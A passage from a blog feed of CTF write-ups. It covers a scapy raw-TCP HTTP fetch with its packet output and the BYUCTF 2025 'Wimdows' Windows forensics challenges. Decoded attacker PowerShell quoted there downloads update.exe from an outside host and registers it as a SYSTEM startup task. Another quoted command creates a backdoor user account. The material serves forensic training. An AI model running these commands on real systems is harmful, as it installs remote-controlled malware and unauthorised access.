flags_found.extend(matches)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> flags_found:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] POTENTIAL FLAGS FOUND:&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> flag <span class="keyword">in</span> <span class="built_in">sorted</span>(<span class="built_in">set</span>(flags_found)):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># Display sample of content</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[*] First 1000 characters:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(body_text[:<span class="number">1000</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(body_text) &gt; <span class="number">2000</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Last 1000 characters:&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(body_text[-<span class="number">1000</span>:])</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Could not decode body as text: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Raw body (first 500 bytes): <span class="subst">&#123;body[:<span class="number">500</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] Script executed&quot;</span>)</span><br></pre></td></tr></table></figure><p>Output of the modified script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> -E python3 ipid.py </span><br><span class="line">[+] Using IPID: 1337, Source Port: 12345</span><br><span class="line">[*] Sending SYN...</span><br><span class="line">Begin emission</span><br><span class="line">.</span><br><span class="line">Finished sending 1 packets</span><br><span class="line">*</span><br><span class="line">Received 2 packets, got 1 answers, remaining 0 packets</span><br><span class="line">[*] Received SYN-ACK</span><br><span class="line">[+] ACK <span class="built_in">seq</span>: 1001, ACK ack: 1710788324</span><br><span class="line">[*] Sending ACK...</span><br><span class="line">Begin emission</span><br><span class="line"></span><br><span class="line">Finished sending 1 packets</span><br><span class="line">.</span><br><span class="line">Received 1 packets, got 0 answers, remaining 1 packets</span><br><span class="line">[+] No immediate response to ACK - this is good!</span><br><span class="line">[*] Sending HTTP GET...</span><br><span class="line">[*] Sending HTTP request...</span><br><span class="line">.</span><br><span class="line">Sent 1 packets.</span><br><span class="line">[*] Starting active TCP capture...</span><br><span class="line">[*] Will send ACKs <span class="keyword">for</span> received data to keep connection alive</span><br><span class="line">[*] Packet 2: <span class="built_in">seq</span>=1710788324, len=1072, expected_seq=1710788324</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710789396</span><br><span class="line">[+] Headers parsed!</span><br><span class="line">[+] Content-Length: 31491</span><br><span class="line">[*] Body progress: 823/31491 bytes (2.6%)</span><br><span class="line">[*] Packet 3: <span class="built_in">seq</span>=1710789396, len=1072, expected_seq=1710789396</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710790468</span><br><span class="line">[*] Body progress: 1895/31491 bytes (6.0%)</span><br><span class="line">[*] Packet 4: <span class="built_in">seq</span>=1710790468, len=1072, expected_seq=1710790468</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710791540</span><br><span class="line">[*] Body progress: 2967/31491 bytes (9.4%)</span><br><span class="line">[*] Packet 5: <span class="built_in">seq</span>=1710791540, len=1072, expected_seq=1710791540</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710792612</span><br><span class="line">[*] Body progress: 4039/31491 bytes (12.8%)</span><br><span class="line">[*] Packet 6: <span class="built_in">seq</span>=1710792612, len=536, expected_seq=1710792612</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710793148</span><br><span class="line">[*] Body progress: 4575/31491 bytes (14.5%)</span><br><span class="line">[*] Packet 7: <span class="built_in">seq</span>=1710793148, len=536, expected_seq=1710793148</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710793684</span><br><span class="line">[*] Body progress: 5111/31491 bytes (16.2%)</span><br><span class="line">[*] Packet 8: <span class="built_in">seq</span>=1710793684, len=536, expected_seq=1710793684</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710794220</span><br><span class="line">[*] Body progress: 5647/31491 bytes (17.9%)</span><br><span class="line">[*] Packet 9: <span class="built_in">seq</span>=1710794220, len=536, expected_seq=1710794220</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710794756</span><br><span class="line">[*] Body progress: 6183/31491 bytes (19.6%)</span><br><span class="line">[*] Packet 10: <span class="built_in">seq</span>=1710794756, len=1072, expected_seq=1710794756</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710795828</span><br><span class="line">[*] Body progress: 7255/31491 bytes (23.0%)</span><br><span class="line">[*] Packet 11: <span class="built_in">seq</span>=1710795828, len=1072, expected_seq=1710795828</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710796900</span><br><span class="line">[*] Body progress: 8327/31491 bytes (26.4%)</span><br><span class="line">[*] Packet 12: <span class="built_in">seq</span>=1710796900, len=1072, expected_seq=1710796900</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710797972</span><br><span class="line">[*] Body progress: 9399/31491 bytes (29.8%)</span><br><span class="line">[*] Packet 13: <span class="built_in">seq</span>=1710797972, len=1072, expected_seq=1710797972</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710799044</span><br><span class="line">[*] Body progress: 10471/31491 bytes (33.3%)</span><br><span class="line">[*] Packet 14: <span class="built_in">seq</span>=1710799044, len=1072, expected_seq=1710799044</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710800116</span><br><span class="line">[*] Body progress: 11543/31491 bytes (36.7%)</span><br><span class="line">[*] Packet 15: <span class="built_in">seq</span>=1710800116, len=536, expected_seq=1710800116</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710800652</span><br><span class="line">[*] Body progress: 12079/31491 bytes (38.4%)</span><br><span class="line">[*] Packet 16: <span class="built_in">seq</span>=1710800652, len=536, expected_seq=1710800652</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710801188</span><br><span class="line">[*] Body progress: 12615/31491 bytes (40.1%)</span><br><span class="line">[*] Packet 17: <span class="built_in">seq</span>=1710801188, len=536, expected_seq=1710801188</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710801724</span><br><span class="line">[*] Body progress: 13151/31491 bytes (41.8%)</span><br><span class="line">[*] Packet 18: <span class="built_in">seq</span>=1710801724, len=536, expected_seq=1710801724</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710802260</span><br><span class="line">[*] Body progress: 13687/31491 bytes (43.5%)</span><br><span class="line">[*] Packet 19: <span class="built_in">seq</span>=1710802260, len=1072, expected_seq=1710802260</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710803332</span><br><span class="line">[*] Body progress: 14759/31491 bytes (46.9%)</span><br><span class="line">[*] Packet 20: <span class="built_in">seq</span>=1710803332, len=1072, expected_seq=1710803332</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710804404</span><br><span class="line">[*] Body progress: 15831/31491 bytes (50.3%)</span><br><span class="line">[*] Packet 21: <span class="built_in">seq</span>=1710804404, len=1072, expected_seq=1710804404</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710805476</span><br><span class="line">[*] Body progress: 16903/31491 bytes (53.7%)</span><br><span class="line">[*] Packet 22: <span class="built_in">seq</span>=1710805476, len=1072, expected_seq=1710805476</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710806548</span><br><span class="line">[*] Body progress: 17975/31491 bytes (57.1%)</span><br><span class="line">[*] Packet 23: <span class="built_in">seq</span>=1710806548, len=536, expected_seq=1710806548</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710807084</span><br><span class="line">[*] Body progress: 18511/31491 bytes (58.8%)</span><br><span class="line">[*] Packet 24: <span class="built_in">seq</span>=1710807084, len=536, expected_seq=1710807084</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710807620</span><br><span class="line">[*] Body progress: 19047/31491 bytes (60.5%)</span><br><span class="line">[*] Packet 25: <span class="built_in">seq</span>=1710807620, len=1072, expected_seq=1710807620</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710808692</span><br><span class="line">[*] Body progress: 20119/31491 bytes (63.9%)</span><br><span class="line">[*] Packet 26: <span class="built_in">seq</span>=1710808692, len=1072, expected_seq=1710808692</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710809764</span><br><span class="line">[*] Body progress: 21191/31491 bytes (67.3%)</span><br><span class="line">[*] Packet 27: <span class="built_in">seq</span>=1710809764, len=1072, expected_seq=1710809764</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710810836</span><br><span class="line">[*] Body progress: 22263/31491 bytes (70.7%)</span><br><span class="line">[*] Packet 28: <span class="built_in">seq</span>=1710810836, len=1072, expected_seq=1710810836</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710811908</span><br><span class="line">[*] Body progress: 23335/31491 bytes (74.1%)</span><br><span class="line">[*] Packet 29: <span class="built_in">seq</span>=1710811908, len=536, expected_seq=1710811908</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710812444</span><br><span class="line">[*] Body progress: 23871/31491 bytes (75.8%)</span><br><span class="line">[*] Packet 30: <span class="built_in">seq</span>=1710812444, len=536, expected_seq=1710812444</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710812980</span><br><span class="line">[*] Body progress: 24407/31491 bytes (77.5%)</span><br><span class="line">[*] Packet 31: <span class="built_in">seq</span>=1710812980, len=1072, expected_seq=1710812980</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710814052</span><br><span class="line">[*] Body progress: 25479/31491 bytes (80.9%)</span><br><span class="line">[*] Packet 32: <span class="built_in">seq</span>=1710814052, len=1072, expected_seq=1710814052</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710815124</span><br><span class="line">[*] Body progress: 26551/31491 bytes (84.3%)</span><br><span class="line">[*] Packet 33: <span class="built_in">seq</span>=1710815124, len=1072, expected_seq=1710815124</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710816196</span><br><span class="line">[*] Body progress: 27623/31491 bytes (87.7%)</span><br><span class="line">[*] Packet 34: <span class="built_in">seq</span>=1710816196, len=1072, expected_seq=1710816196</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710817268</span><br><span class="line">[*] Body progress: 28695/31491 bytes (91.1%)</span><br><span class="line">[*] Packet 35: <span class="built_in">seq</span>=1710817268, len=1072, expected_seq=1710817268</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710818340</span><br><span class="line">[*] Body progress: 29767/31491 bytes (94.5%)</span><br><span class="line">[*] Packet 36: <span class="built_in">seq</span>=1710818340, len=1072, expected_seq=1710818340</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710819412</span><br><span class="line">[*] Body progress: 30839/31491 bytes (97.9%)</span><br><span class="line">[*] Packet 37: <span class="built_in">seq</span>=1710819412, len=652, expected_seq=1710819412</span><br><span class="line">[*] Sent ACK: <span class="built_in">seq</span>=1065, ack=1710820064</span><br><span class="line">[*] Body progress: 31491/31491 bytes (100.0%)</span><br><span class="line">[+] All data received!</span><br><span class="line"></span><br><span class="line">[+] Capture completed!</span><br><span class="line">[+] Total packets received: 37</span><br><span class="line">[+] Total data received: 31740 bytes</span><br><span class="line">[+] Expected: 31491 bytes</span><br><span class="line">[+] Body received: 31491 bytes (100.0%)</span><br><span class="line"></span><br><span class="line">[*] Saving complete response to http_response_1748338637.txt</span><br><span class="line">[+] Saved 31740 characters to http_response_1748338637.txt</span><br><span class="line"></span><br><span class="line">[+] HTTP Headers:</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 27 May 2025 09:37:16 GMT</span><br><span class="line">Server: Apache/2.4.63 (Unix)</span><br><span class="line">Last-Modified: Fri, 23 May 2025 14:07:48 GMT</span><br><span class="line">ETag: <span class="string">&quot;7b03-635ce1f7bb500&quot;</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 31491</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">[+] HTTP Response Body (31491 bytes):</span><br><span class="line">[!] POTENTIAL FLAGS FOUND:</span><br><span class="line">    flag&#123;4e3dd38dcd14821aa327e2c96af2799d&#125;</span><br><span class="line"></span><br><span class="line">[*] First 1000 characters:</span><br><span class="line">Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui <span class="keyword">in</span> ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?</span><br><span class="line">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed <span class="keyword">do</span> eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad</span><br><span class="line"></span><br><span class="line">[*] Last 1000 characters:</span><br><span class="line">itur porta porta nulla, sit amet suscipit nisi ornare <span class="keyword">in</span>. Etiam pharetra vitae lacus <span class="keyword">in</span> mollis. Suspendisse gravida erat lectus, non suscipit lacus vulputate vel. Proin ut nibh feugiat, mollis nunc <span class="built_in">id</span>, semper sapien. Ut cursus orci purus, quis viverra nisi dapibus quis. Curabitur faucibus porttitor ex at pulvinar. Ut facilisis purus eget enim blandit bibendum. Vivamus vehicula non ligula vitae eleifend.</span><br><span class="line"></span><br><span class="line">Phasellus ac libero turpis. Nunc dictum magna vehicula, vestibulum mauris eu, congue ex. Integer leo sem, mattis non neque a, semper rutrum nisi. Proin lobortis leo venenatis ornare imperdiet. Donec ut cursus eros. Maecenas quis malesuada odio. Etiam quis commodo ante. Suspendisse varius dui ac lacus maximus, <span class="keyword">in</span> pharetra dolor laoreet. Praesent est urna, pretium non fringilla pretium, finibus vel magna. Integer ultrices sit amet sapien cursus pretium. Etiam suscipit ipsum <span class="keyword">in</span> facilisis suscipit. Cras interdum urna sed nisl suscipit interdum.</span><br><span class="line"></span><br><span class="line">fin: flag&#123;4e3dd38dcd14821aa327e2c96af2799d&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Script executed</span><br></pre></td></tr></table></figure><h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">flag&#123;4e3dd38dcd14821aa327e2c96af2799d&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;I participated in NahamCon CTF 2025, organized by JohnHammond, as a member of my institute’s club, InfoSecIITR. This writeup details the </summary>
      
    
    
    
    <category term="CTF-Writeups" scheme="https://g4rud4kun.github.io/categories/CTF-Writeups/"/>
    
    
    <category term="forensics" scheme="https://g4rud4kun.github.io/tags/forensics/"/>
    
    <category term="networking" scheme="https://g4rud4kun.github.io/tags/networking/"/>
    
    <category term="scapy" scheme="https://g4rud4kun.github.io/tags/scapy/"/>
    
  </entry>
  
  <entry>
    <title>BYUCTF 2025</title>
    <link href="https://g4rud4kun.github.io/2025/05/18/BYUCTF-2025/"/>
    <id>https://g4rud4kun.github.io/2025/05/18/BYUCTF-2025/</id>
    <published>2025-05-18T06:28:11.000Z</published>
    <updated>2025-05-18T11:36:57.560Z</updated>
    
    <content type="html"><![CDATA[<p>BYUCTF 2025!</p><p>I participated in BYUCTF 2025, organized by BYU Cyberia, as a member of my institute’s club, InfoSecIITR. This writeup details the challenge I solved during the competition.</p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Wimdows-1"><a href="#Wimdows-1" class="headerlink" title="Wimdows 1"></a>Wimdows 1</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>Earlier this week, an attacker managed to get into one of our Windows servers… can you help us figure out what happened? The VM files for this challenge are located below (the credentials are vagrant&#x2F;vagrant):</p><p><a href="https://byu.box.com/v/byuctf-wimdows">https://byu.box.com/v/byuctf-wimdows</a><br>What CVE did the attacker exploit to get a shell on the machine? Wrap your answer in byuctf{}. E.g. byuctf{CVE-2021-38759}</p><p>Hint: Figure out what process the attacker exploited and look up vulnerabilities associated with it.</p><p>Author: deltabluejay</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>We have provided a VM .ova file, which can be used with either VMware or Oracle VirtualBox. I chose VirtualBox, as I’m more comfortable with it, and they have also provided the VirtualBox Guest Additions file. This allows us to enlarge the screen and use features like copy-and-paste by loading and creating a new VM from the .ova file.</p><p>After starting the VM, you’ll see a screen like this:</p><p><img src="/images/posts/2025-byuctf/vm_view.png" alt="Initial VM View"></p><p>You can log in using either the vagrant or Administrator account, both with the password vagrant. I first logged in as the vagrant user and noticed a goose roaming around the screen, as shown below:</p><p><img src="/images/posts/2025-byuctf/goose.png" alt="Goose Desktop"></p><p>Then I switched to the Administrator user to gain superuser privileges if needed. I checked the PowerShell history but didn’t find anything, so I moved on to examine the Windows Event Logs. I found entries for System, Security, Application, Windows, Windows PowerShell, and more.</p><p>I began analyzing the Windows PowerShell logs and came across the following log:</p><p><img src="/images/posts/2025-byuctf/elastic.png" alt="ElasticSearch"></p><p>It showed that Elasticsearch version 1.1.1 was being installed — a very old version. I also found several suspicious activities related to Elasticsearch in the Sysmon logs. This version likely has multiple CVEs, and one of them was an RCE (Remote Code Execution) vulnerability. We identified the relevant CVE.</p><h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">byuctf&#123;CVE-2014-3120&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Wimdows-2"><a href="#Wimdows-2" class="headerlink" title="Wimdows 2"></a>Wimdows 2</h3><h4 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>This challenge uses the same files as for Wimdows 1.</p><p>Once they got in, the attacker ran some commands on the machine, but it looks like they tried to hide what they were doing. See if you can find anything interesting there (your answer will be found already in byuctf{} format).<br>Author: deltabluejay</p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>While searching through the Windows PowerShell logs, I found several Base64-encoded PowerShell commands, as shown below:</p><p><img src="/images/posts/2025-byuctf/wimdows2.png" alt="Wimdows2 Flag"></p><p>The decoded Base64 string is:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write-output &#x27;byuctf&#123;n0w_th4t5_s0m3_5u5_l00k1ng_p0w3rsh3ll_139123&#125;&#x27;</span><br></pre></td></tr></table></figure><h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">byuctf&#123;n0w_th4t5_s0m3_5u5_l00k1ng_p0w3rsh3ll_139123&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Wimdows-3"><a href="#Wimdows-3" class="headerlink" title="Wimdows 3"></a>Wimdows 3</h3><h4 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>This challenge uses the same files as for Wimdows 1.</p><p>The attacker also created a new account- what group did they add this account to? Wrap your answer in byuctf{}. E.g. byuctf{CTF Players}.</p><p>Reminder - all answers are case-INsensitive for all of these problems<br>Author: deltabluejay</p><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>As we had already observed the user accounts while logging in as Administrator, I decided to investigate further using PowerShell, as shown below:</p><p><img src="/images/posts/2025-byuctf/pwsh.png" alt="Wimdows3 PwSh"></p><p>When I ran the command <code>$ net user</code>, I noticed an additional user named <code>phasma</code>. Upon further inspection, I found that phasma was the only account created recently in 2025, while the others were from 2022. Later, while reviewing the Windows PowerShell logs, I found confirmation via a PowerShell command that showed how the phasma user was created, as shown below:</p><p><img src="/images/posts/2025-byuctf/phasma.png" alt="Wimdows3 logs"></p><p>The decoded Base64 string: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user phasma f1rst0rd3r! /add</span><br></pre></td></tr></table></figure><p>We obtained the group from the terminal output.</p><h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">byuctf&#123;Remote</span> <span class="string">Desktop</span> <span class="string">Users&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Wimdows-4"><a href="#Wimdows-4" class="headerlink" title="Wimdows 4"></a>Wimdows 4</h3><h4 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>This challenge uses the same files as for Wimdows 1.</p><p>Using their access, the attacker also deployed a C2 binary on the machine - what C2 framework was it, and what IP address was the C2 attempting to connect to?</p><p>Format your answer like so: byuctf{c2 framework_ip address}. E.g. byuctf{evilosx_10.1.1.1}<br>Author: deltabluejay</p><h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>I came across the following log, which caught my attention:</p><p><img src="/images/posts/2025-byuctf/update_log.png" alt="Update.exe log"></p><p>The decoded Base64 string: </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$BINARY</span>=<span class="string">&#x27;C:\Windows\System32\update.exe&#x27;</span> ; <span class="variable">$ProgressPreference</span> = <span class="string">&#x27;SilentlyContinue&#x27;</span> ; <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://192.168.1.107:8000/update.exe&quot;</span> <span class="literal">-OutFile</span> <span class="variable">$BINARY</span> ; schtasks /create /tn <span class="string">&quot;updates&quot;</span> /tr <span class="variable">$BINARY</span> /ru <span class="string">&#x27;SYSTEM&#x27;</span> /<span class="built_in">sc</span> onstart /rl highest ; schtasks /run /tn <span class="string">&quot;updates&quot;</span></span><br></pre></td></tr></table></figure><p>I proceeded to check the downloaded file (update.exe) and executed it, but it didn’t show any noticeable output. I then extracted the file on my host laptop, where Windows Defender immediately quarantined it. After that, I uploaded it to <a href="https://www.virustotal.com/gui/file/57baac9260834ea53ae47e09d76247a4c692dfbcec05aa4ed141773af7a4754c/">VirusTotal</a>, which returned the following result:</p><p><img src="/images/posts/2025-byuctf/sliver.png" alt="Sliver"></p><p>It revealed that the file was using the Sliver C2 Framework and was attempting to connect to the IP address 192.168.1.224 over TCP port 8888 <code>(IP Traffic: TCP 192.168.1.224:8888)</code>.</p><h4 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">byuctf&#123;sliver_192.168.1.224&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Wimdows-5"><a href="#Wimdows-5" class="headerlink" title="Wimdows 5"></a>Wimdows 5</h3><h4 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>This challenge uses the same files as for Wimdows 1.</p><p>Last but not least, the attacker put another backdoor in the machine to give themself SYSTEM privileges… what was it? (your answer will be found directly in byuctf{} format)<br>Author: deltabluejay</p><h4 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h4><p>After fully exploring the Windows PowerShell logs, I moved on to review other logs, and the Sysmon logs particularly caught my attention. I found one log entry that contained the flag directly in plain text, as shown below:</p><p><img src="/images/posts/2025-byuctf/sysmon.png" alt="Sysmon Logs"></p><h4 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">byuctf&#123;00p5_4ll_b4ckd00r5_139874&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;BYUCTF 2025!&lt;/p&gt;
